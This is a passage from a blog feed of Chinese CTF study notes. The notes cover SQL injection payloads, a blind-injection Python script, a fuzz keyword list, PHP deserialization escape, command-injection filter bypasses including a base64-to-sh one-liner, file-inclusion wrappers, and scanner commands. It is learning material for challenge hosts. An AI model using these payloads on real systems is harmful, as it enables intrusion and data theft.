href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;and">http://127.0.0.1/sqllib/Less-5/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p><p>联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据<br>利用/<em>!union</em>/可以绕过对union的过滤<br>异或<br>可以起到代替or的作用<br>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p><p>SQL注入一点小技巧<br>当 = 被过滤时，用 regexp 来代替 = ，用 &lt;&gt; 代替 !=</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>handler--select</title>
      <link href="/2021/10/08/handler--select/"/>
      <url>/2021/10/08/handler--select/</url>
      
        <content type="html"><![CDATA[<p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。<br>句柄 相当于一个指针，是一个广义的指针，不是特定指向某一个形式（整数、数组、对象等）</p><h1 id="打开一个表名为-tbl-name-的表的句柄"><a href="#打开一个表名为-tbl-name-的表的句柄" class="headerlink" title="打开一个表名为 tbl_name 的表的句柄"></a>打开一个表名为 tbl_name 的表的句柄</h1><p>HANDLER tbl_name OPEN [ [AS] alias]</p><h1 id="1、通过指定索引查看表，可以指定从索引那一行开始，通过-NEXT-继续浏览"><a href="#1、通过指定索引查看表，可以指定从索引那一行开始，通过-NEXT-继续浏览" class="headerlink" title="1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览"></a>1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览</h1><p>HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,…)<br>    [ WHERE where_condition ] [LIMIT … ]</p><h1 id="2、通过索引查看表"><a href="#2、通过索引查看表" class="headerlink" title="2、通过索引查看表"></a>2、通过索引查看表</h1><h1 id="FIRST-获取第一行（索引最小的一行）"><a href="#FIRST-获取第一行（索引最小的一行）" class="headerlink" title="FIRST: 获取第一行（索引最小的一行）"></a>FIRST: 获取第一行（索引最小的一行）</h1><h1 id="NEXT-获取下一行"><a href="#NEXT-获取下一行" class="headerlink" title="NEXT: 获取下一行"></a>NEXT: 获取下一行</h1><h1 id="PREV-获取上一行"><a href="#PREV-获取上一行" class="headerlink" title="PREV: 获取上一行"></a>PREV: 获取上一行</h1><h1 id="LAST-获取最后一行（索引最大的一行）"><a href="#LAST-获取最后一行（索引最大的一行）" class="headerlink" title="LAST: 获取最后一行（索引最大的一行）"></a>LAST: 获取最后一行（索引最大的一行）</h1><p>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }<br>    [ WHERE where_condition ] [LIMIT … ]</p><h1 id="3、不通过索引查看表"><a href="#3、不通过索引查看表" class="headerlink" title="3、不通过索引查看表"></a>3、不通过索引查看表</h1><h1 id="READ-FIRST-获取句柄的第一行"><a href="#READ-FIRST-获取句柄的第一行" class="headerlink" title="READ FIRST: 获取句柄的第一行"></a>READ FIRST: 获取句柄的第一行</h1><h1 id="READ-NEXT-依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）"><a href="#READ-NEXT-依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）" class="headerlink" title="READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）"></a>READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）</h1><h1 id="最后一行执行之后再执行-READ-NEXT-会返回一个空的结果"><a href="#最后一行执行之后再执行-READ-NEXT-会返回一个空的结果" class="headerlink" title="最后一行执行之后再执行 READ NEXT 会返回一个空的结果"></a>最后一行执行之后再执行 READ NEXT 会返回一个空的结果</h1><p>HANDLER tbl_name READ { FIRST | NEXT }<br>    [ WHERE where_condition ] [LIMIT … ]</p><h1 id="关闭已打开的句柄"><a href="#关闭已打开的句柄" class="headerlink" title="关闭已打开的句柄"></a>关闭已打开的句柄</h1><p>HANDLER tbl_name CLOSE</p><p>实战：<br><a href="http://fa463541-8469-420e-a928-d97bbb9039c3.node4.buuoj.cn:81/?inject=1&#39;;HANDLER">http://fa463541-8469-420e-a928-d97bbb9039c3.node4.buuoj.cn:81/?inject=1&#39;;HANDLER</a> FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql盲注脚本</title>
      <link href="/2021/10/08/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/10/08/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>import requests<br>url = ‘<a href="http://9b2dfbf9-7ef6-4104-bb7b-d4aad1150ace.node4.buuoj.cn:81/index.php&#39;">http://9b2dfbf9-7ef6-4104-bb7b-d4aad1150ace.node4.buuoj.cn:81/index.php&#39;</a><br>result = ‘’<br>for i in range(1, 1000):<br>    low = 30<br>    high = 200<br>    mid = (low + high) // 2<br>    while high &gt; low:<br>        payload = “id=0^if((ascii(substr((select(flag)from(flag)),” + str(i) + “,1)))&gt;” + str(mid) + “,1,2)”<br>        print(payload)<br>        data = {<br>            “id”: payload<br>        }<br>        response = requests.post(url, data=data)</p><pre><code>    if &quot;Hello&quot; in response.text:        low = mid+1    else:        high = mid    mid = (low + high) // 2result += chr(int(mid))print(result)</code></pre><p>print(result)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当information_schema被禁用</title>
      <link href="/2021/10/08/%E5%BD%93information_schema%E8%A2%AB%E7%A6%81%E7%94%A8/"/>
      <url>/2021/10/08/%E5%BD%93information_schema%E8%A2%AB%E7%A6%81%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>mysql在被waf禁掉了information_schema库后利用思路<br>information_schema<br>简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p><p>MySQL5.7的新特性<br>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。<br>schema_auto_increment_columns，该视图的作用简单来说就是用来对表自增ID的监控。<br>mysql默认是关闭InnoDB存储引擎的<br>想通过注入获取到没有自增主键的表的数据怎么办？<br>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffe<br>payload:<br> schema_auto_increment_columns<br> ?id=-1’ union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()–+</p><p>schema_table_statistics_with_buffer<br>?id=-1’ union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()–+</p><p>获取字段名</p><p>获取第一列的列名 ?id=-1’ union all select*from (select * from users as a join users b)c–+</p><p>获取次列及后续列名</p><p>?id=-1’ union all select*from (select * from users as a join users b using(id,username))c–+<br>一般要超级管理员才可以访问sys<br>在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。</p><p>(select <code>2</code> from (select 1,2,3 union select * from table_name)a)  //前提是要知道表名<br>((select c from (select 1,2,3 c union select * from users)b))    1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量</p><p>如果表引擎为innodb<br>并且MYSQL&gt;5.5<br>innodb_table_stats、innodb_table_index存放所以库名表名<br>select table_name from mysql.innodb_table_stats where database_name=库名;</p><p>方法三：<br>爆库名、表名、字段名<br>当过滤information_schema等关键字时，可以用下面方法爆库名<br>select 1,2,3 from users where 1=abc()<br>–&gt;ERROR 1305(42000):FUNCTION fl4g.abc does not exist<br>爆表名：<br>通过polygon ()报错<br>and polygon (()select * from(select user ())a)b );</p><p>select 1,2,3 from users where Polygon(id);<br>slect 1,2,3 from users where linestring(id);<br>ERROR 1367(22007):lllegal non geometric ‘<code>fl4g</code>.<code>users</code>.<code>id</code>‘value found during parsing<br>爆Column<br>通过linestring ()报错<br>and linestring (()select * from(select user() )a)b );</p><p>select 1,2,3 from users where (select * from (select * from users as a join users as b)as c);<br>ERROR 1060(42s21):Duplicate column name ‘id’<br>select 1,2,3 from users where (select * from (select * from users as a join users as b using(id))as c);<br>ERROR 1060(42s21):Duplicate column name ‘username’<br>前提是users表存在</p><p>1’/<strong>/union/</strong>/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22’%23<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’ limit 0,1’ at line 1</p><p>-1’/<strong>/union/</strong>/select/<strong>/1, (select/</strong>/group_concat(a)/<strong>/from(select/</strong>/1,2/<strong>/as/</strong>/a,3/<strong>/as/</strong>/b/<strong>/union/</strong>/sele ct*from/<strong>/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/</strong>/‘</p><p>-1’/<strong>/union/</strong>/select/<strong>/1, (select/</strong>/group_concat(b)/<strong>/from(select/</strong>/1,2/<strong>/as/</strong>/a,3/<strong>/as/</strong>/b/<strong>/union/</strong>/sele ct*from/<strong>/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/</strong>/‘</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-fuzz测试字典</title>
      <link href="/2021/10/08/sql-fuzz%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/"/>
      <url>/2021/10/08/sql-fuzz%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<p>length<br>+<br>handler<br>like<br>select<br>sleep<br>database<br>delete<br>having<br>or<br>as<br>-~<br>BENCHMARK<br>limit<br>left<br>select<br>insert<br>sys.schema_auto_increment_columns<br>join<br>right<br>#<br>&amp;<br>&amp;&amp;<br><br>handler</p><hr><p>–<br>–+<br>INFORMATION<br>–<br>;<br>!<br>%<br>+<br>xor<br>&lt;&gt;<br>(</p><blockquote></blockquote><p>&lt;<br>)<br>.<br>^<br>=<br>AND<br>BY<br>CAST<br>COLUMN<br>COUNT<br>CREATE<br>END<br>case<br>‘1’=’1<br>when<br>admin’<br>“<br>length<br>+<br>length<br>REVERSE<br>ascii<br>select<br>database<br>left<br>right<br>‘<br>union<br>||<br>oorr<br>/<br>//<br>//*<br><em>/</em><br>/**/<br>anandd<br>GROUP<br>HAVING<br>IF<br>INTO<br>JOIN<br>LEAVE<br>LEFT<br>LEVEL<br>sleep<br>LIKE<br>NAMES<br>NEXT<br>NULL<br>OF<br>ON<br>|<br>infromation_schema<br>user<br>OR<br>ORDER<br>ORD<br>SCHEMA<br>SELECT<br>SET<br>TABLE<br>THEN<br>UPDATE<br>USER<br>USING<br>VALUE<br>VALUES<br>WHEN<br>WHERE<br>ADD<br>AND<br>prepare<br>set<br>update<br>delete<br>drop<br>inset<br>CAST<br>COLUMN<br>CONCAT<br>GROUP_CONCAT<br>group_concat<br>CREATE<br>DATABASE<br>DATABASES<br>alter<br>DELETE<br>DROP<br>floor<br>rand()<br>information_schema.tables<br>TABLE_SCHEMA<br>%df<br>concat_ws()<br>concat<br>LIMIT<br>ORD<br>ON<br>extractvalue<br>order<br>CAST()<br>by<br>ORDER<br>OUTFILE<br>RENAME<br>REPLACE<br>SCHEMA<br>SELECT<br>SET<br>updatexml<br>SHOW<br>SQL<br>TABLE<br>THEN<br>TRUE<br>instr<br>benchmark<br>format<br>bin<br>substring<br>ord<br>UPDATE<br>VALUES<br>VARCHAR<br>VERSION<br>WHEN<br>WHERE<br>/*<br>`<br>,<br>users<br>%0a<br>%0b<br>mid<br>for<br>BEFORE<br>REGEXP<br>RLIKE<br>in<br>sys schemma<br>SEPARATOR<br>XOR<br>CURSOR<br>FLOOR<br>sys.schema_table_statistics_with_buffer<br>INFILE<br>count<br>%0c<br>from<br>%0d<br>%a0<br>=<br>@<br>else<br>substr</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 字典 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字典 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化逃逸</title>
      <link href="/2021/10/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/"/>
      <url>/2021/10/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>1.替换修改后导致序列化字符串变长<br>示例代码：<br><?phpfunction filter($str){    return str_replace('bb', 'ccc', $str);}class A{    public $name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"666666";};';    public $pass=123456;}$AA=new A();echo serialize($AA)."\n";$res=filter(serialize($AA));$c=unserialize($res);echo $c->pass;?><br>由于替换后bb–&gt;ccc增加了一个字符，当有28个bb时。会增加28个字符，刚好填充完成，导致后面的字符逃逸 “;s:4:”pass”;s:6:”666666”;};</p><p>2.替换修改后导致序列化字符串变短<br>示例代码：<br>&lt;?php<br>function str_rep($string){<br>    return preg_replace( ‘/php|test/‘,’’, $string);<br>}</p><p>$test[‘name’] = $_GET[‘name’];<br>$test[‘sign’] = $_GET[‘sign’];<br>$test[‘number’] = ‘2020’;<br>$temp = str_rep(serialize($test));<br>printf($temp);<br>$fake = unserialize($temp);<br>echo ‘<br>‘;<br>print(“name:”.$fake[‘name’].’<br>‘);<br>print(“sign:”.$fake[‘sign’].’<br>‘);<br>print(“number:”.$fake[‘number’].’<br>‘);<br>?&gt;</p><p>在sign中加入 “;s:6:”number”;s:4:”2020”;} 长度27<br>需要把前面的sign值给取消掉<br>有 “;  +  s:4:”sign”;s:54:”hello          –&gt;24个字符<br>payload：?name=testtesttesttesttesttest&amp;sign=hello”;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2000”;}<br>每次根据这个来调整就可  *****hello 是24  </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小知识点</title>
      <link href="/2021/10/08/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2021/10/08/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);<br>$a=’system’;<br>$a(‘ls’);</p><p>寻找flag文件常用命令小结：<br>    system(‘ls’) : 列举当前目录下的所有文件<br>    system(“find / -name flag<em>”)：查找所有文件名匹配flag</em>的文件<br>    system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件</p><p>如果网站存在备份文件，常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf”</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见绕过方法</title>
      <link href="/2021/10/08/%E7%BB%95%E8%BF%87/"/>
      <url>/2021/10/08/%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>空格替代:<br>    ${IFS}<br>    $IFS$9<br>    &lt;<br>    &lt;&gt;<br>    {,}</p><hr><p>sh</p><p>/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2-d|sh</p><p>变量拼接：<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p><p>内联注释(将反引号命令的结果作为输入来执行命令)<br>/?ip=127.0.0.1;cat$IFS$2<code>ls</code></p><p>查看命令补充<br>    cat     由第一行开始显示内容，并将所有内容输出<br>    tac     从最后一行倒序显示内容，并将所有内容输出<br>    more    根据窗口大小，一页一页的现实文件内容<br>    less    和more类似，但是是从后往前翻页并且，进行可以搜索字符<br>    head    只显示头几行<br>    tail    只显示最后几行<br>    nl      类似于cat -n，显示时输出行号</p><hr><p>进制绕过<br>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);</p><p>$a=’system’;<br>$a(‘ls’);</p><p>常用函数：base_convert(“1001”2,10)是将二进制的1001转换为10进制<br>dechex 10进制转成16进制<br>hex2bin  16进制转成字符串的函数<br>_GET</p><p><a href="http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p=%7B&#39;system&#39;};$$p">http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p={&#39;system&#39;};$$p</a>(cat /flag)<br>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi=system&amp;abs=cat /flag<br>$_GET{pi}($_GET{abs})  pi=system abs=cat /flag<br>本来是$_GET[]   –&gt;如果[]被过滤可以用$_GET{}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从网站源码中寻找脚本后门</title>
      <link href="/2021/10/08/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/10/08/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>import os<br>import requests<br>import re<br>import threading<br>import time<br>print(‘开始时间：  ‘+  time.asctime( time.localtime(time.time()) ))<br>s1=threading.Semaphore(100)                                            #这儿设置最大的线程数<br>filePath = r”D:/soft/phpstudy/PHPTutorial/WWW/src/“<br>os.chdir(filePath)                                                    #改变当前的路径<br>requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接<br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = False                                             # 设置连接活跃状态为False<br>def get_content(file):<br>    s1.acquire()<br>    print(‘trying   ‘+file+ ‘     ‘+ time.asctime( time.localtime(time.time()) ))<br>    with open(file,encoding=’utf-8’) as f:                            #打开php文件，提取所有的$_GET和$_POST的参数<br>            gets = list(re.findall(‘$_GET[&#39;(.<em>?)&#39;]‘, f.read()))<br>            posts = list(re.findall(‘$_POST[&#39;(.</em>?)&#39;]‘, f.read()))<br>    data = {}                                                        #所有的$_POST<br>    params = {}                                                        #所有的$_GET<br>    for m in gets:<br>        params[m] = “echo ‘xxxxxx’;”<br>    for n in posts:<br>        data[n] = “echo ‘xxxxxx’;”<br>    url = ‘<a href="http://127.0.0.1/src/&#39;+file">http://127.0.0.1/src/&#39;+file</a><br>    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST<br>    req.close()                                                # 关闭请求  释放内存<br>    req.encoding = ‘utf-8’<br>    content = req.text<br>    #print(content)<br>    if “xxxxxx” in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数<br>        flag = 0<br>        for a in gets:<br>            req = session.get(url+’?%s=’%a+”echo ‘xxxxxx’;”)<br>            content = req.text<br>            req.close()                                                # 关闭请求  释放内存<br>            if “xxxxxx” in content:<br>                flag = 1<br>                break<br>        if flag != 1:<br>            for b in posts:<br>                req = session.post(url, data={b:”echo ‘xxxxxx’;”})<br>                content = req.text<br>                req.close()                                                # 关闭请求  释放内存<br>                if “xxxxxx” in content:<br>                    break<br>        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，<br>            param = a<br>        else:<br>            param = b<br>        print(‘找到了利用文件： ‘+file+”  and 找到了利用的参数：%s” %param)<br>        print(‘结束时间：  ‘ + time.asctime(time.localtime(time.time())))<br>    s1.release()</p><p>for i in files:                                                            #加入多线程<br>   t = threading.Thread(target=get_content, args=(i,))<br>   t.start()</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见软件命令</title>
      <link href="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="单个url检测"><a href="#单个url检测" class="headerlink" title="单个url检测"></a>单个url检测</h1><p>./xray_windows_amd64 webscan –url <a href="https://xxx.edu.cn/">https://xxx.edu.cn</a> –html-output edu.html</p><h1 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h1><p>./xray_windows_amd64 webscan –url-file edu.txt –html-output e du.html</p><p> E:\sakura的工具箱\扫描\xray\xray_windows_amd64.exe webscan –url-file C:\Users\Sakura\Desktop\target.txt –html-output C:\Users\Sakura\Desktop\edus.html</p><p>dirsearch使用:</p><p>dirsearch自带的字典在db目录下</p><p>常用的参数有</p><ul><li><p>-u 指定网址</p></li><li><p>-e 指定网站语言</p></li><li><p>-w 指定字典</p></li><li><p>-r 递归目录（跑出目录后，继续跑目录下面的目录）</p></li><li><p>–random-agents 使用随机UA</p></li><li><p>-t 指定线程</p></li><li><p>–random-agents 使用随机US（默认再db/user-agents.txt中，可以自己添加）</p></li><li><p>-x 排除指定状态码 </p></li><li><p>-s 请求之间得延时（秒）</p></li><li><p>扫描网站zip以及php文件排除403状态码</p><pre><code> dirsearch.py -u http://127.0.0.1  -e php,zip -x 403</code></pre><p>扫描所有类型并且设置线程为20默认为10</p><pre><code> dirsearch.py -u http://127.0.0.1 -e*-t 20</code></pre><p>自定义字典扫描</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -w db/php.txt</code></pre><p>使用随机ua头</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* --random-agents</code></pre><p>指定cookie扫描</p><pre><code>dirsearch.py -u http://127.0.0.1:999  -e* -c &quot;user=Mo60;&quot;</code></pre><p>递归扫描最大3层</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -r 3</code></pre><p>每一秒扫描一次</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -s 1</code></pre><h2 id="关于字典"><a href="#关于字典" class="headerlink" title="关于字典"></a>关于字典</h2><p>字典必须是文本文件,使用特殊词％EXT％,会在扫描时候根据 -e 传进来的值生成对应的字典</p><p>例:</p><pre><code>Mo60.%EXT%</code></pre><p>使用以下语句去扫描</p><pre><code class="bash"> dirsearch.py -u http://127.0.0.1 -e jsp -w db/str.txt</code></pre></li></ul><pre><code>python dirsearch.py -u http://node4.buuoj.cn:25833/ -e * -s 1 -x 400,403,404,500,503,429 -w C:\Users\Sakura\Desktop\dic\备份.txt -o C:\Users\Sakura\Desktop\1.txt</code></pre><pre><code>python dirsearch.py  -u http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/ -e * --timeout=2 -t 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</code></pre><pre><code>python dirsearch.py -u http://xxx.com/ --header-list=E:\sakura的工 具箱\字典\user-gent.txt -e * -s 1 -t 3 --full-url --proxy=http://127.0.0.1:1080</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 软件常用命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件包含常见协议</title>
      <link href="/2021/10/08/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/10/08/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>php&gt;=5.2<br>php://filter协议   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt<br>php://input协议  ?file=php://filter/read=convert.base64-encode/resource=./index.php<br>data://协议<br>data://协议允许读入<br> 要求：打开allow_url_fopen  allow_url_include<br>?file=data://text/plain,<?php phpinfo()?><br>?file=data://text/plain;base64,编码</p><p>file协议：<br>file:///文件路径</p><p>如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 代码\命令执行类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx重要文件位置</title>
      <link href="/2021/10/08/nginx%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE/"/>
      <url>/2021/10/08/nginx%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件包含常见协议</title>
      <link href="/2021/10/08/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8/"/>
      <url>/2021/10/08/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>pre_replace /e模式是要在正则匹配到特定特征的字符串直接当作php代码来执行，执行结果替换原字符，相当于eval函数。<br>payload:next.php?\S*=${getflag()}&amp;cmd=system(‘ls /‘);</p><h2 id="绕过preg-match的话可以使用-绕过，比如在linux下执行l-s，效果等同于ls"><a href="#绕过preg-match的话可以使用-绕过，比如在linux下执行l-s，效果等同于ls" class="headerlink" title="绕过preg_match的话可以使用\绕过，比如在linux下执行l\s，效果等同于ls"></a>绕过preg_match的话可以使用\绕过，比如在linux下执行l\s，效果等同于ls</h2><h2 id="call-user-func-函数-参数-，返回值为函数执行参数后的结果"><a href="#call-user-func-函数-参数-，返回值为函数执行参数后的结果" class="headerlink" title="call_user_func(函数, 参数)，返回值为函数执行参数后的结果"></a>call_user_func(函数, 参数)，返回值为函数执行参数后的结果</h2><p>intval() 函数用于获取变量的整数值。</p><p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>PHP 4, PHP 5, PHP 7<br>语法</p><p>int intval ( mixed $var [, int $base = 10 ] )</p><pre><code>$var：要转换成 integer 的数量值。$base：转化所使用的进制。</code></pre><p>intval()函数的使用方式，发现如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型<br>示例：<br>&lt;?php<br>$num=’2e4’;<br>echo(intval($num));  ——-&gt;2<br>echo(intval($num+1));———&gt;20001</p><hr><p>require_once(dirname(<strong>FILE</strong>).”/./config_uc.php”);<br>一、<strong>FILE</strong> php定义的为当前文件路径及文件名的常量，如: d:/wwwroot/dedecms/index.php<br>二、dirname(<strong>FILE</strong>) 为函数，取得文件路径的目录名；<br>echo dirname(“d:/wwwroot/dedecms/index.php”）结果为：d:/wwwroot/dedecms<br>三、require_once(dirname(<strong>FILE</strong>).”/./config_uc.php”); 假设当前文件为d:/wwwroot/dedecms/index.php结果为<br>require_once(“d:/wwwroot/dedecms/config_uc.php”);</p><p>另外/./config_uc.php 中./为当前目录</p><p>require_once(str_replace(‘/tieba’,’’,dirname(<strong>FILE</strong>)).”/./config_uc.php”); </p><p>“/./config_uc.php” 这个就是文件路径了<br>/./应该是表示当前目录<br>/../可以表示上级目录</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
